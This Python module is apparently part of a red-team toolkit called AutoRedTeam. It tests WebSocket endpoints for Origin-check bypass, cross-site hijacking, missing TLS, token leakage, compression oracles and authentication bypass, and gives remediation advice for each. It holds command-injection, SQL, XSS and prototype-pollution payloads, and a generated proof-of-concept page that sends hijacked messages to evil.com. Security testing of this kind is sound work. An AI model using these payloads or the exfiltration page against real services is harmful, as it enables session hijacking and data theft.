#!/usr/bin/env python3
"""
WebSocket安全测试模块

提供全面的WebSocket安全测试功能，包括:
- Origin检查绕过测试
- 跨站WebSocket劫持(CSWSH)测试
- 认证绕过测试
- 消息注入测试
- 压缩Oracle攻击测试
- TLS安全测试
- URL Token泄露测试

作者: AutoRedTeam
版本: 3.0.0
"""

import base64
import hashlib
import logging
import os
import re
import socket
import ssl
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

from .base import (
    APITestResult,
    APIVulnType,
    BaseAPITester,
    Severity,
)

logger = logging.getLogger(__name__)


class WebSocketTester(BaseAPITester):
    """
    WebSocket安全测试器

    对WebSocket端点进行全面的安全测试。

    使用示例:
        tester = WebSocketTester('wss://api.example.com/ws')
        results = tester.test()
    """

    name = 'websocket'
    description = 'WebSocket安全测试器'
    version = '3.0.0'

    # WebSocket魔术字符串
    WS_MAGIC = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'

    # Origin绕过Payload
    ORIGIN_BYPASS_PAYLOADS = [
        ('', 'empty_origin'),
        ('null', 'null_origin'),
        ('https://evil.com', 'external_domain'),
        ('http://localhost', 'localhost'),
        ('http://127.0.0.1', 'loopback_ip'),
        ('http://[::1]', 'ipv6_loopback'),
        ('file://', 'file_protocol'),
    ]

    # WebSocket消息注入Payload
    WS_INJECTION_PAYLOADS = [
        # 权限提升
        ('{"action":"admin","data":"test"}', 'admin_action'),
        ('{"type":"SUBSCRIBE","channel":"admin"}', 'admin_channel'),
        ('{"role":"admin"}', 'role_elevation'),
        # 原型污染
        ('{"__proto__":{"admin":true}}', 'prototype_pollution'),
        ('{"constructor":{"prototype":{"admin":true}}}', 'constructor_pollution'),
        # 命令注入
        ('{"cmd":"id"}', 'command_injection'),
        ('{"exec":"cat /etc/passwd"}', 'exec_injection'),
        # SQL注入
        ('{"id":"1\' OR \'1\'=\'1"}', 'sql_injection'),
        # XSS
        ('{"msg":"<script>alert(1)</script>"}', 'xss_payload'),
    ]

    # 敏感URL参数
    SENSITIVE_PARAMS = [
        'token', 'api_key', 'apikey', 'secret', 'password',
        'pwd', 'auth', 'jwt', 'session', 'sid', 'access_token',
        'refresh_token', 'key', 'credential'
    ]

    def __init__(self, target: str, config: Optional[Dict[str, Any]] = None):
        """
        初始化WebSocket测试器

        Args:
            target: WebSocket URL (ws:// 或 wss://)
            config: 可选配置，可包含:
                - target_origin: 目标Origin（用于绕过测试）
                - auth_token: 认证Token
                - extra_headers: 额外HTTP头
        """
        super().__init__(target, config)

        # 解析WebSocket URL
        self._parse_ws_url()

        # 配置项
        self.target_origin = self.config.get('target_origin', f'{self.scheme}://{self.host}')
        self.auth_token = self.config.get('auth_token', '')

    def _parse_ws_url(self) -> None:
        """解析WebSocket URL"""
        parsed = urlparse(self.target)

        self.scheme = parsed.scheme.lower()
        self.is_secure = self.scheme == 'wss'
        self.host = parsed.hostname or 'localhost'
        self.port = parsed.port or (443 if self.is_secure else 80)
        self.path = parsed.path or '/'
        if parsed.query:
            self.path += '?' + parsed.query
        self.query_params = parse_qs(parsed.query)

    def test(self) -> List[APITestResult]:
        """执行所有WebSocket安全测试"""
        self.clear_results()

        # 执行各项测试
        self.test_no_tls()
        self.test_token_in_url()
        self.test_origin_bypass()
        self.test_cswsh()
        self.test_compression_oracle()
        self.test_auth_bypass()

        return self._results

    def test_no_tls(self) -> Optional[APITestResult]:
        """
        测试是否使用TLS加密

        漏洞描述:
            使用ws://而不是wss://会导致数据明文传输，
            容易被中间人攻击拦截和篡改。

        Returns:
            测试结果或None
        """
        if not self.is_secure:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.WEBSOCKET_NO_TLS,
                severity=Severity.HIGH,
                title='WebSocket未使用TLS加密',
                description=(
                    f'WebSocket使用不安全的{self.scheme}://协议，'
                    '数据以明文传输，容易被中间人攻击。'
                ),
                evidence={
                    'protocol': self.scheme,
                    'url': self.target
                },
                remediation=(
                    '1. 使用wss://替代ws://协议\n'
                    '2. 配置有效的TLS证书\n'
                    '3. 强制HTTPS/WSS连接'
                )
            )
            return result

        return None

    def test_token_in_url(self) -> Optional[APITestResult]:
        """
        测试URL中是否包含敏感Token

        漏洞描述:
            将认证Token放在URL参数中可能导致:
            - 在日志中泄露
            - 在Referrer头中泄露
            - 在浏览器历史中泄露

        Returns:
            测试结果或None
        """
        found_params: List[str] = []

        for param_name in self.query_params.keys():
            param_lower = param_name.lower()
            for sensitive in self.SENSITIVE_PARAMS:
                if sensitive in param_lower:
                    found_params.append(param_name)
                    break

        if found_params:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.WEBSOCKET_TOKEN_LEAK,
                severity=Severity.MEDIUM,
                title='WebSocket URL中包含敏感Token',
                description=(
                    f'发现{len(found_params)}个敏感参数在URL中传递，'
                    '可能导致Token泄露。'
                ),
                evidence={
                    'found_params': found_params,
                    'url_sample': self.target[:100] + '...'
                },
                remediation=(
                    '1. 使用WebSocket消息传递认证信息\n'
                    '2. 使用HTTP头（如Sec-WebSocket-Protocol）传递Token\n'
                    '3. 在建立连接后通过消息进行认证'
                )
            )
            return result

        return None

    def test_origin_bypass(self) -> Optional[APITestResult]:
        """
        测试Origin检查绕过

        漏洞描述:
            如果服务端不正确验证Origin头，
            攻击者可以从恶意网站建立WebSocket连接。

        Returns:
            测试结果或None
        """
        accepted_origins: List[Dict[str, Any]] = []

        # 添加目标相关的绕过尝试
        payloads = list(self.ORIGIN_BYPASS_PAYLOADS)

        if self.target_origin:
            parsed = urlparse(self.target_origin)
            target_host = parsed.netloc

            payloads.extend([
                (f'https://evil{target_host}', 'suffix_bypass'),
                (f'https://evil.{target_host}', 'subdomain_suffix'),
                (f'https://{target_host}.evil.com', 'subdomain_prefix'),
                (f'https://{target_host}@evil.com', 'userinfo_bypass'),
            ])

        for origin, bypass_type in payloads:
            conn = self._try_ws_connect(origin)

            if conn.get('connected'):
                accepted_origins.append({
                    'origin': origin or '(empty)',
                    'bypass_type': bypass_type,
                    'response_headers': conn.get('headers', {})
                })

        if accepted_origins:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.WEBSOCKET_ORIGIN_BYPASS,
                severity=Severity.HIGH,
                title='WebSocket Origin检查绕过',
                description=(
                    f'服务端接受了{len(accepted_origins)}个恶意Origin，'
                    '未正确验证请求来源。'
                ),
                evidence={
                    'accepted_origins': accepted_origins
                },
                remediation=(
                    '1. 在服务端严格验证Origin头\n'
                    '2. 使用Origin白名单机制\n'
                    '3. 拒绝空Origin和null Origin\n'
                    '4. 使用精确匹配而不是后缀匹配'
                )
            )
            return result

        return None

    def test_cswsh(self) -> Optional[APITestResult]:
        """
        测试跨站WebSocket劫持(CSWSH)

        漏洞描述:
            如果WebSocket端点依赖Cookie认证但不验证Origin，
            攻击者可以从恶意网站建立连接并劫持用户会话。

        Returns:
            测试结果或None
        """
        attacker_origin = 'https://evil.com'
        conn = self._try_ws_connect(attacker_origin)

        if conn.get('connected'):
            poc_html = self._generate_cswsh_poc()

            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.WEBSOCKET_CSWSH,
                severity=Severity.HIGH,
                title='跨站WebSocket劫持(CSWSH)',
                description=(
                    '攻击者可以从恶意网站建立WebSocket连接，'
                    '劫持用户会话并读取/发送消息。'
                ),
                evidence={
                    'attacker_origin': attacker_origin,
                    'poc_html': poc_html[:500] + '...'
                },
                remediation=(
                    '1. 严格验证Origin头\n'
                    '2. 实施CSRF Token验证\n'
                    '3. 使用Token认证而不是仅依赖Cookie\n'
                    '4. 在WebSocket握手时验证认证信息'
                )
            )
            return result

        return None

    def test_compression_oracle(self) -> Optional[APITestResult]:
        """
        测试压缩Oracle攻击(CRIME)

        漏洞描述:
            如果WebSocket启用permessage-deflate压缩，
            攻击者可能通过观察消息大小推断敏感数据。

        Returns:
            测试结果或None
        """
        conn = self._try_ws_connect(
            '',
            extra_headers={'Sec-WebSocket-Extensions': 'permessage-deflate'}
        )

        if conn.get('connected'):
            extensions = conn.get('extensions', [])

            for ext in extensions:
                if 'deflate' in ext.lower():
                    result = self._create_result(
                        vulnerable=True,
                        vuln_type=APIVulnType.WEBSOCKET_COMPRESSION_ORACLE,
                        severity=Severity.MEDIUM,
                        title='WebSocket压缩Oracle攻击风险',
                        description=(
                            f'服务端启用了压缩扩展: {ext}\n'
                            '如果传输敏感数据，可能遭受CRIME类攻击。'
                        ),
                        evidence={
                            'compression_extension': ext,
                            'all_extensions': extensions
                        },
                        remediation=(
                            '1. 对于敏感数据传输，禁用压缩\n'
                            '2. 在服务端配置: Sec-WebSocket-Extensions: (空)\n'
                            '3. 不要在同一消息中混合用户输入和敏感数据'
                        )
                    )
                    return result

        return None

    def test_auth_bypass(self) -> Optional[APITestResult]:
        """
        测试认证绕过

        漏洞描述:
            WebSocket连接可能不验证认证信息，
            或接受无效的认证Token。

        Returns:
            测试结果或None
        """
        tests: List[Dict[str, Any]] = []

        # 测试1: 完全不带认证
        conn1 = self._try_ws_connect('')
        tests.append({
            'description': '无认证连接',
            'connected': conn1.get('connected', False)
        })

        # 测试2: 带无效Token
        conn2 = self._try_ws_connect(
            '',
            extra_headers={'Authorization': 'Bearer invalid_token_12345'}
        )
        tests.append({
            'description': '无效Token连接',
            'connected': conn2.get('connected', False)
        })

        # 测试3: 空Token
        conn3 = self._try_ws_connect(
            '',
            extra_headers={'Authorization': 'Bearer '}
        )
        tests.append({
            'description': '空Token连接',
            'connected': conn3.get('connected', False)
        })

        # 检查是否存在认证绕过
        bypassed = [t for t in tests if t['connected']]

        if bypassed:
            result = self._create_result(
                vulnerable=True,
                vuln_type=APIVulnType.WEBSOCKET_AUTH_BYPASS,
                severity=Severity.HIGH,
                title='WebSocket认证绕过',
                description=(
                    f'{len(bypassed)}种方式可以绕过认证建立WebSocket连接。'
                ),
                evidence={
                    'bypass_methods': bypassed,
                    'all_tests': tests
                },
                remediation=(
                    '1. 在WebSocket握手时强制验证认证信息\n'
                    '2. 验证每个连接的Token有效性\n'
                    '3. 实施连接级别的认证检查\n'
                    '4. 拒绝无认证或认证无效的连接'
                )
            )
            return result

        return None

    # ==================== 辅助方法 ====================

    def _generate_ws_key(self) -> str:
        """生成WebSocket密钥"""
        return base64.b64encode(os.urandom(16)).decode('utf-8')

    def _compute_accept_key(self, key: str) -> str:
        """计算WebSocket Accept密钥"""
        concat = key + self.WS_MAGIC
        sha1 = hashlib.sha1(concat.encode()).digest()
        return base64.b64encode(sha1).decode('utf-8')

    def _try_ws_connect(
        self,
        origin: str = '',
        extra_headers: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        尝试WebSocket连接

        Args:
            origin: Origin头值
            extra_headers: 额外HTTP头

        Returns:
            连接结果
        """
        result = {
            'connected': False,
            'headers': {},
            'extensions': [],
            'error': ''
        }

        sock = None
        try:
            # 创建Socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if self.is_secure:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)

            sock.connect((self.host, self.port))

            # 构造升级请求
            key = self._generate_ws_key()
            request = self._build_upgrade_request(key, origin, extra_headers)

            sock.sendall(request.encode('utf-8'))

            # 接收响应
            response_data = b''
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
                if b'\r\n\r\n' in response_data:
                    break

            # 解析响应
            status_code, headers = self._parse_http_response(response_data)
            result['headers'] = headers

            if status_code == 101:
                # 验证Accept Key
                expected_accept = self._compute_accept_key(key)
                actual_accept = headers.get('sec-websocket-accept', '')

                if actual_accept == expected_accept:
                    result['connected'] = True

                    # 获取扩展
                    extensions = headers.get('sec-websocket-extensions', '')
                    if extensions:
                        result['extensions'] = [e.strip() for e in extensions.split(',')]
            else:
                result['error'] = f'HTTP {status_code}'

        except socket.timeout:
            result['error'] = '连接超时'
        except ConnectionRefusedError:
            result['error'] = '连接被拒绝'
        except Exception as e:
            result['error'] = str(e)
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

        return result

    def _build_upgrade_request(
        self,
        key: str,
        origin: str = '',
        extra_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """构造WebSocket升级请求"""
        host_header = self.host if self.port in [80, 443] else f'{self.host}:{self.port}'

        lines = [
            f'GET {self.path} HTTP/1.1',
            f'Host: {host_header}',
            'Upgrade: websocket',
            'Connection: Upgrade',
            f'Sec-WebSocket-Key: {key}',
            'Sec-WebSocket-Version: 13',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        ]

        if origin:
            lines.append(f'Origin: {origin}')

        if extra_headers:
            for name, value in extra_headers.items():
                lines.append(f'{name}: {value}')

        lines.append('')
        lines.append('')

        return '\r\n'.join(lines)

    def _parse_http_response(self, data: bytes) -> Tuple[int, Dict[str, str]]:
        """解析HTTP响应"""
        try:
            header_end = data.find(b'\r\n\r\n')
            if header_end == -1:
                return 0, {}

            header_part = data[:header_end].decode('utf-8', errors='ignore')
            lines = header_part.split('\r\n')

            # 解析状态行
            status_line = lines[0]
            match = re.match(r'HTTP/\d\.\d\s+(\d+)', status_line)
            status_code = int(match.group(1)) if match else 0

            # 解析头部
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    name, value = line.split(':', 1)
                    headers[name.strip().lower()] = value.strip()

            return status_code, headers

        except Exception as e:
            logger.debug(f'解析HTTP响应失败: {e}')
            return 0, {}

    def _generate_cswsh_poc(self) -> str:
        """生成CSWSH PoC HTML"""
        ws_url = self.target.replace('wss://', 'wss://').replace('ws://', 'ws://')

        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC - Cross-Site WebSocket Hijacking</title>
</head>
<body>
    <h1>Cross-Site WebSocket Hijacking PoC</h1>
    <div id="status">Status: Connecting...</div>
    <div id="log"></div>

    <script>
        var ws = new WebSocket("{ws_url}");

        ws.onopen = function() {{
            document.getElementById("status").textContent = "Status: Connected!";
            log("WebSocket connected successfully!");

            // 发送测试消息
            ws.send('{{"type":"ping"}}');
            log("Sent: ping");
        }};

        ws.onmessage = function(event) {{
            log("Received: " + event.data);

            // 将数据发送到攻击者服务器
            fetch("https://evil.com/collect", {{
                method: "POST",
                body: event.data,
                mode: "no-cors"
            }});
        }};

        ws.onerror = function(error) {{
            log("Error: " + error.message);
        }};

        ws.onclose = function() {{
            log("Connection closed");
        }};

        function log(msg) {{
            var logDiv = document.getElementById("log");
            logDiv.innerHTML += "<p>" + msg + "</p>";
        }}
    </script>
</body>
</html>'''
        return poc


# 便捷函数
def quick_websocket_test(target: str) -> Dict[str, Any]:
    """
    快速WebSocket安全测试

    Args:
        target: WebSocket URL

    Returns:
        测试结果摘要
    """
    tester = WebSocketTester(target)
    results = tester.test()
    return tester.get_summary().to_dict()


__all__ = [
    'WebSocketTester',
    'quick_websocket_test',
]
